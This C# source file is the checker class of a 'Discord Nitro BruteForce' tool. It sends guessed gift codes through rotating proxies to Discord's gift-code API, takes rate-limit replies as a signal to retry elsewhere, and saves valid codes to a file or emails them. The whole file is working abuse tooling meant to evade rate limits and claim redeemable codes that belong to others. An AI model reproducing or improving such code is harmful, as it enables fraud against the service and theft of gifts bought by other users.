using Leaf.xNet;
using System;
using System.IO;
using System.Threading;
using Newtonsoft.Json.Linq;

namespace Discord_Nitro_BruteForce
{
    class Checker
    {
        static object fileLocker = new object();

        static string getWumpCode(string code) => $"WUMP-{code[0]}{code[1]}{code[2]}{code[3]}{code[4]}-{code[5]}{code[6]}{code[7]}{code[8]}{code[9]}-{code[10]}{code[11]}{code[12]}{code[13]}{code[14]}";
        
        public static void Check(string code, ProxyClient proxy)
        {
            using (HttpRequest req = new HttpRequest()
            {
                IgnoreProtocolErrors = true,
                Proxy = proxy
            })
            {
                HttpResponse res = req.Get($"https://discordapp.com/api/v8/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true");

                JToken message;
                JObject resJson = JObject.Parse(res.ToString());
                resJson.TryGetValue("message", out message);

                if ((string)message == "You are being rate limited.")
                {
                    if (Program.verbose)
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine($"[-] {code}: {res.StatusCode}");
                    }
                    throw new HttpException();
                }

                else if ((string)message == "Unknown Gift Code")
                {
                    Interlocked.Increment(ref Program.ch);
                    if (Program.verbose)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"[-] {code}");
                    }
                    return;
                }

                else
                {
                    Interlocked.Increment(ref Program.goods);

                    if (!Program.verbose)
                        Console.SetCursorPosition(0, 5 + Program.goods);

                    string wump = getWumpCode(code);

                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"[+] {wump} (Message: {message})"); //I don't know status code of valid nitro gift

                    lock (fileLocker)
                    {
                        File.AppendAllText("good.txt", $"{wump} (Message: {message})\r\n");
                    }

                    if (Program.emailnotification)
                        Program.SendEmail(wump, "Hey! I founded valid code!");
                    return;
                }
            }
        }
    }
}
